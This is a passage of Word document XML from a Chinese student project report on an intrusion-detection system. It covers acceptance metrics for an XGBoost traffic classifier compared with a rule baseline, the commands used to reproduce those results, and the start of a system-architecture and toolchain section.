        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DD95F90">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2.5 验收指标</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C636A0E">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>下面的指标在立项时确定，实测值全部来自仓库内的产物文件与本次运行的截图，没有手填。其中“相对规则基线的提升”这一项是后来补充的——做完规则引擎之后我们才意识到，只说“准确率 0.97”没有意义，必须有一个同口径的确定性下限作对照。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF47C58">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 2-4　验收指标与实测值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381"/>
        <w:gridCol w:w="3175"/>
      </w:tblGrid>
      <w:tr w14:paraId="3925D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shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="464687EC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>指标</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="759A99A9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>目标</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2E29551F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>实测值</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="5823A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32DEC46A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>单条会话的特征维度</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4186B0C4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>78（对齐 CICFlowMeter）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="379ED486">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>78</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="557B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69D0FA84">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>检测类别数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7CE47BE8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>6 类</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="031FEF45">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>BENIGN / DDoS / DoS Hulk / PortScan / Patator / Heartbleed</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="7540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061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="35DF1FFA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>小模型留出集 macro-F1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6D1A2DE9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>≥ 0.95</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6EB600A9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.9719（xgboost，最后 10% 封存集）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="21F55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6E43EF95">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>相对阈值规则基线的提升</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="560E218F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>可量化</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="523EE804">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>+0.3924（0.9719 对 0.5795，同一段测试集）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="267A2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0B1957BF">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>单份诊断报告生成耗时</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0B4C723C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>&lt; 10 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3FB388FC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>4.6—9.9 s，中位 4.97 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="5DA2E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207BB92B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>报告正文字数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7F6C8259">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>≥ 800 字</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6F7E455D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>中位 1 122 字</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="334D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061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5DF778E3">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>单元测试</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2381" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="66D181A6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>全部通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3175" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4A93E0E1">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>59 条全部通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4BC3E208">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72B0CE26">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>每一项都能在本机复现，复现命令与对应产物如下：模型指标来自 python models/train.py --split temporal-cv（产物 models/artifacts/comparison.json）；规则基线来自 python tools/rules_baseline.py（产物 rules_baseline.json）；报告耗时与字数来自 reports 表的 elapsed_ms 与 content 长度；单元测试来自 python -m pytest。复现时唯一需要外部条件的是大模型耗时——它受网络与模型服务负载影响，所以我们报的是区间与中位数，而不是单次最优值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE5645D">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:pageBreakBefore/>
        <w:spacing w:before="360" w:after="200" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>三、任务实现</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E2FD5A">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3.1 系统总体架构与工程骨架</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121E2470">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>四层之间只有三条纵向连接：边缘层向中心层做 HTTPS/JSON 上报并接收告警回执；中心层向大模型层发一次诊断请求并收回结构化报告；中心层向展示层提供只读查询接口。原始以太网帧只在实验网段与边缘层之间流动，不出局域网。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3452F7CE">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="3419475"/>
            <wp:effectExtent l="0" t="0" r="146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72000" cy="3420000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="31524857">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-1　系统总体架构（云边协同；①—④ 为单次检测的数据流）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12696EF8">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这张图里有一处需要强调：中心层的推理、规则、检索都在同一个进程里串行调用，没有引入消息队列。对两周周期的课设而言，多一个中间件就多一个失效点；代价是连续大流量下上报接口会被推理阻塞，这一点作为已知限制写在 3.8.2 节。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03993C21">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>工程骨架包含四样东西：一份统一的 config.yaml（默认值，本地覆盖写 config.local.yaml 深度合并）、一个 settings.py（配置加载与“这个地址算不算本机/局域网”的判定）、一份 requirements.txt，以及 pytest.ini。其中 settings.is_local_endpoint 是被反复用到的一个小函数——探针连局域网中心、看板连中心时都要据此决定 trust_env，否则本机写坏的代理变量会把请求带偏。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDF8D7F">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-1　开发环境与工具链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3742"/>
        <w:gridCol w:w="3402"/>
      </w:tblGrid>
      <w:tr w14:paraId="5B43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shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="20872155">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>类别</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3742" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="11179B78">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>组件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="72F32211">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>说明</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="7B96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224F3D0F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>运行环境</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3742" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2D9117AE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Ubuntu（Linux 6.8）、Python 3.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5CE3EF8C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>开发与演示在同一台笔记本上完成</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="5D82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2D408A83">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>抓包解析</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3742" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="132A2AF6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Scapy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2F05351F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>纯 Python 构造与解析以太网帧、IP、TCP/UDP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0FACF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474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="17933C16">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>机器学习</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3742" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7C253095">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>scikit-learn、XGBoost、LightGBM、CatBoost</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
